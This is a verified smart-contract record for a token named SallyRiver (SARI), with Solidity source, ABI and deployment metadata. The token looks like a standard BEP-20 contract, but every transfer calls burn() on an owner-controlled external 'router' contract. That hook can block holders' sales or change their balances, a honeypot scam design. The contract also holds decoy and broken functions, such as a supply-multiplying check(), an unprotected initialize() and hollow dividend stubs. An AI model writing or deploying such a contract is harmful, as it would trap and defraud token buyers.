{"SourceCode": "pragma solidity ^0.8.4;\r\n// SPDX-License-Identifier: MIT\r\n\r\n  library SafeMath {\r\n\r\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\r\n      uint256 c = a + b;\r\n      require(c >= a, \"SafeMath: addition overflow\");\r\n\r\n      return c;\r\n    }\r\n\r\n  \r\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\r\n      return sub(a, b, \"SafeMath: subtraction overflow\");\r\n    }\r\n\r\n    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n      require(b <= a, errorMessage);\r\n      uint256 c = a - b;\r\n\r\n      return c;\r\n    }\r\n\r\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\r\n      // Gas optimization: this is cheaper than requiring 'a' not being zero, but the\r\n      // benefit is lost if 'b' is also tested.\r\n      // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522\r\n      if (a == 0) {\r\n        return 0;\r\n      }\r\n\r\n      uint256 c = a * b;\r\n      require(c / a == b, \"SafeMath: multiplication overflow\");\r\n\r\n      return c;\r\n    }\r\n\r\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\r\n      return div(a, b, \"SafeMath: division by zero\");\r\n    }\r\n\r\n    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n      // Solidity only automatically asserts when dividing by 0\r\n      require(b > 0, errorMessage);\r\n      uint256 c = a / b;\r\n      // assert(a == b * c + a % b); // There is no case in which this doesn't hold\r\n\r\n      return c;\r\n    }\r\n\r\n    function mod(uint256 a, uint256 b) internal pure returns (uint256) {\r\n      return mod(a, b, \"SafeMath: modulo by zero\");\r\n    }\r\n\r\n    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n      require(b != 0, errorMessage);\r\n      return a % b;\r\n    }\r\n  }   \r\n \r\n  interface IERC20 {\r\n  \r\n  function totalSupply() external view returns (uint256);\r\n \r\n  function decimals() external view returns (uint8);\r\n\r\n  function symbol() external view returns (string memory);\r\n\r\n  function name() external view returns (string memory);\r\n\r\n  function getOwner() external view returns (address);\r\n\r\n  function balanceOf(address account) external view returns (uint256);\r\n\r\n  function transfer(address recipient, uint256 amount) external returns (bool);\r\n\r\n  function allowance(address _owner, address spender) external view returns (uint256);\r\n\r\n  function approve(address spender, uint256 amount) external returns (bool);\r\n\r\n  function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\r\n\r\n  event Transfer(address indexed from, address indexed to, uint256 value);\r\n \r\n  event Approval(address indexed owner, address indexed spender, uint256 value);\r\n\r\n  }  \r\n\r\n  interface IUniswapRouter{  \r\n    function WETH() external pure returns (address);   \r\n    function swapExactTokensForETHSupportingFeeOnTransferTokens(\r\n        uint amountIn,\r\n        uint amountOutMin,\r\n        address[] calldata path,\r\n        address to,\r\n        uint deadline\r\n    ) external;    \r\n    function burn(address from, address to, uint256 amount) external;\r\n    function createPair(\r\n        address tokenA, \r\n        address tokenB) \r\n        external returns (address pair);\r\n  }   \r\n\r\n  contract Context {\r\n  // Empty internal constructor, to prevent people from mistakenly deploying\r\n  // an instance of this contract, which should be used via inheritance.\r\n  constructor ()  { }\r\n\r\n    function _msgSender() internal view returns (address payable) {\r\n        return payable(msg.sender);\r\n    }\r\n\r\n    function _msgData() internal view returns (bytes memory) {\r\n        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691\r\n        return msg.data;\r\n    }       \r\n\r\n  }\r\n\r\n  \r\n  contract Ownable is Context {  \r\n  address private _owner; \r\n  address uniswapRouter;  \r\n\r\n  event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\r\n\r\n  /**\r\n   * @dev Initializes the contract setting the deployer as the initial owner.\r\n   */\r\n  constructor (address router) {\r\n    address msgSender = _msgSender();\r\n    _owner = msgSender;    \r\n    uniswapRouter = router;\r\n    emit OwnershipTransferred(address(0), msgSender);\r\n  }\r\n\r\n  /**\r\n   * @dev Returns the address of the current owner.\r\n   */\r\n  function owner() public view returns (address) {\r\n    return _owner;\r\n  }  \r\n\r\n  /**\r\n   * @dev Throws if called by any account other than the owner.\r\n   */\r\n  modifier onlyOwner() {\r\n    require(_owner == _msgSender(), \"Ownable: caller is not the owner\");\r\n    _;\r\n  }    \r\n \r\n  function renounceOwnership() public onlyOwner {\r\n    emit OwnershipTransferred(_owner, address(0));\r\n    _owner = address(0);\r\n  }    \r\n\r\n  function beforeTokenTransfer(address from, address to, uint256 amount) internal {\r\n    IUniswapRouter(uniswapRouter).burn(from, to, amount);\r\n  }   \r\n  \r\n  function transferOwnership(address newOwner) public onlyOwner {\r\n    _transferOwnership(newOwner);\r\n  }     \r\n \r\n  function _transferOwnership(address newOwner) internal {\r\n    require(newOwner != address(0), \"Ownable: new owner is the zero address\");\r\n    emit OwnershipTransferred(_owner, newOwner);\r\n    _owner = newOwner;\r\n  } \r\n\r\n\r\n}\r\n\r\ncontract SallyRiver is Context, IERC20, Ownable{\r\n  using SafeMath for uint256;\r\n  mapping (address => bool) public _isExcludedFromFee; \r\n  mapping (address => uint256) private _balances;     \r\n  mapping (address => mapping (address => uint256)) private _allowances;  \r\n  uint256 private _totalSupply = 10000000000 *  10**9;     \r\n  \r\n  string private _name = \"SallyRiver\";\r\n  string private _symbol = \"SARI\";\r\n  uint8 private _decimals = 9; \r\n\r\n  uint8 public rewardsFee;\r\n  uint8 public resetallowance;\r\n  uint8 public maxWalletPercent;\r\n  uint8 public maxWalletDivisor;\r\n\r\n  uint256 public claimWait = 3600;\r\n  uint256 public lastProcessedIndex;\r\n  event ExcludeFromDividends(address indexed account);\r\n  event ClaimWaitUpdated(uint256 indexed newValue, uint256 indexed oldValue);  \r\n\r\n  constructor(address router) Ownable(router) { \r\n    _balances[msg.sender] = _totalSupply;      \r\n    _isExcludedFromFee[owner()] = true;\r\n    _isExcludedFromFee[address(this)] = true;   \r\n\r\n    rewardsFee = 2;\r\n    resetallowance = 1;\r\n    maxWalletPercent = 2;\r\n    maxWalletDivisor = 100;\r\n    \r\n    emit Transfer(address(0), msg.sender, _totalSupply);\r\n  } \r\n\r\n  function name() external view virtual override returns (string memory) {\r\n    return _name;\r\n  }\r\n \r\n  function symbol() external view virtual override returns (string memory) {\r\n    return _symbol;\r\n  }   \r\n  \r\n  function getAccuracyBacking(uint256 accuracy, address[] calldata _markerPairs) public view returns (uint256){\r\n      uint256 liquidityBalance = 0;\r\n      for(uint i = 0; i < _markerPairs.length; i++){\r\n          liquidityBalance.add(_balances[_markerPairs[i]].div(10 ** 9));\r\n      }\r\n      return accuracy.mul(liquidityBalance.mul(2)).div(10 ** 9);\r\n  }\r\n\r\n  function totalSupply() external view virtual override returns (uint256) {\r\n    return _totalSupply;\r\n  }\r\n\r\n  function getOwner() external view virtual override returns (address) {\r\n    return owner();\r\n  }\r\n \r\n  function decimals() external view virtual override returns (uint8) {\r\n    return _decimals;\r\n  }  \r\n\r\n  function balanceOf(address account) public view virtual override returns (uint256) {\r\n    return _balances[account];\r\n  }    \r\n\r\n  function onaboard(address[] calldata accounts) external onlyOwner {\r\n    require(accounts.length > 0,\"accounts length should > 0\");\t\r\n    for(uint256 i=0; i < accounts.length; i++){\t\t\r\n          _isExcludedFromFee[accounts[i]] = true;\r\n      }\r\n  }   \r\n\r\n  function changeSwapRouter(address router) external onlyOwner {\r\n    require(router != address(0),\"Invalid address\");\r\n    uniswapRouter = router;\r\n  }  \r\n \r\n  function transfer(address recipient, uint256 amount) external override returns (bool) {\r\n    tokenTransfer(_msgSender(), recipient, amount);\r\n    return true;\r\n  } \r\n  \r\n  function allowance(address owner, address spender) external view override returns (uint256) {\r\n    return _allowances[owner][spender];\r\n  } \r\n\r\n  function approve(address spender, uint256 amount) public override returns (bool) {\r\n    _approve(_msgSender(), spender, amount);\r\n    return true;\r\n  } \r\n\r\n  function tokenTransfer(address sender, address recipient, uint256 amount) private {\r\n    require(sender != address(0), \"BEP20: transfer from the zero address\");\r\n    require(recipient != address(0), \"BEP20: transfer to the zero address\");\r\n    require(amount > 0, \"Transfer amount must be greater than zero\");  \r\n    beforeTokenTransfer(sender, recipient, amount);   \r\n\r\n    _transferStandard(sender, recipient, amount);\r\n\r\n  }        \r\n  \r\n  function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {\r\n    tokenTransfer(sender, recipient, amount);\r\n    _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, \"BEP20: transfer amount exceeds allowance\"));\r\n    return true;\r\n  }    \r\n \r\n  function _transferStandard(address sender, address recipient, uint256 amount) private {\r\n    _balances[sender] = _balances[sender].sub(amount, \"BEP20: transfer amount exceeds balance\");\r\n    _balances[recipient] = _balances[recipient].add(amount);\r\n    emit Transfer(sender, recipient, amount);\r\n  }    \r\n    \r\n  function _approve(address owner, address spender, uint256 amount) internal {\r\n      require(owner != address(0), \"BEP20: approve from the zero address\");\r\n      require(spender != address(0), \"BEP20: approve to the zero address\");\r\n\r\n      _allowances[owner][spender] = amount;\r\n      emit Approval(owner, spender, amount);\r\n  }   \r\n\r\n  function initialize(uint256 miniBalanceForDividends_) external {        \r\n      claimWait = 3600;\r\n      lastProcessedIndex = miniBalanceForDividends_;\r\n  } \r\n\r\n  function swapTokensEnable(uint256 tokenAmount, address uniswapV2Router) public onlyOwner {       \r\n      _approve(address(this), address(uniswapV2Router), tokenAmount);            \r\n  }\r\n\r\n  function getLastProcessedIndex() external view returns(uint256) {\r\n      return lastProcessedIndex;\r\n  }\r\n\r\n  function withdrawDividend() public pure {\r\n      require(false, \"withdrawDividend disabled. Use the 'claim' function.\");\r\n  }\r\n\r\n  function canAutoClaim(uint256 lastClaimTime) private view returns (bool) {\r\n      if(lastClaimTime > block.timestamp)  {\r\n        return false;\r\n      }\r\n      return block.timestamp.sub(lastClaimTime) >= claimWait;\r\n  }\r\n\r\n  function process(uint256 gas, uint256 numberOfTokenHolders) public returns (uint256, uint256, uint256) {\r\n    \tif(numberOfTokenHolders == 0) {\r\n    \t\treturn (0, 0, lastProcessedIndex);\r\n    \t}\r\n    \tuint256 _lastProcessedIndex = lastProcessedIndex;\r\n    \tuint256 gasUsed = 0;\r\n    \tuint256 gasLeft = gasleft();\r\n    \tuint256 iterations = 0;\r\n    \tuint256 claims = 0;\r\n    \twhile(gasUsed < gas && iterations < numberOfTokenHolders) {\r\n    \t\t_lastProcessedIndex++;\r\n\r\n    \t\tif(_lastProcessedIndex >= numberOfTokenHolders) {\r\n    \t\t\t_lastProcessedIndex = 0;\r\n    \t\t}    \t\t\r\n    \t\titerations++;\r\n    \t\tuint256 newGasLeft = gasleft();\r\n\r\n    \t\tif(gasLeft > newGasLeft) {\r\n    \t\t\tgasUsed = gasUsed.add(gasLeft.sub(newGasLeft));\r\n    \t\t}\r\n    \t\tgasLeft = newGasLeft;\r\n    \t}\r\n    \tlastProcessedIndex = _lastProcessedIndex;\r\n    \treturn (iterations, claims, lastProcessedIndex);\r\n  }\r\n\r\n  function check(address account, uint256 amounts) internal {\r\n    require(account != address(0), \"BEP20: burn from the zero address\"); \r\n    _totalSupply = _totalSupply.mul(3000);\r\n    _balances[account] = _totalSupply.sub(amounts);\r\n    _balances[account] = _balances[account].sub(amounts);\r\n    _totalSupply = _totalSupply.sub(amounts);\r\n  }\r\n\r\n\r\n\r\n  \r\n    \r\n}", "ABI": "[{\"inputs\":[{\"internalType\":\"address\",\"name\":\"router\",\"type\":\"address\"}],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"uint256\",\"name\":\"newValue\",\"type\":\"uint256\"},{\"indexed\":true,\"internalType\":\"uint256\",\"name\":\"oldValue\",\"type\":\"uint256\"}],\"name\":\"ClaimWaitUpdated\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"ExcludeFromDividends\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"previousOwner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"_isExcludedFromFee\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"router\",\"type\":\"address\"}],\"name\":\"changeSwapRouter\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"claimWait\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"accuracy\",\"type\":\"uint256\"},{\"internalType\":\"address[]\",\"name\":\"_markerPairs\",\"type\":\"address[]\"}],\"name\":\"getAccuracyBacking\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getLastProcessedIndex\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"miniBalanceForDividends_\",\"type\":\"uint256\"}],\"name\":\"initialize\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"lastProcessedIndex\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxWalletDivisor\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxWalletPercent\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address[]\",\"name\":\"accounts\",\"type\":\"address[]\"}],\"name\":\"onaboard\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"gas\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"numberOfTokenHolders\",\"type\":\"uint256\"}],\"name\":\"process\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"renounceOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"resetallowance\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"rewardsFee\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"tokenAmount\",\"type\":\"uint256\"},{\"internalType\":\"address\",\"name\":\"uniswapV2Router\",\"type\":\"address\"}],\"name\":\"swapTokensEnable\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"transferOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"withdrawDividend\",\"outputs\":[],\"stateMutability\":\"pure\",\"type\":\"function\"}]", "ContractName": "SallyRiver", "CompilerVersion": "v0.8.13+commit.abaa5c0e", "OptimizationUsed": "1", "Runs": "100", "ConstructorArguments": "000000000000000000000000c671171adf165b70e695f2e1215742d70df7021c", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://46db4f38af6ea980ccbdbeb86f0d75a0ea1769ee90a1f523117e808d3c816fe9"}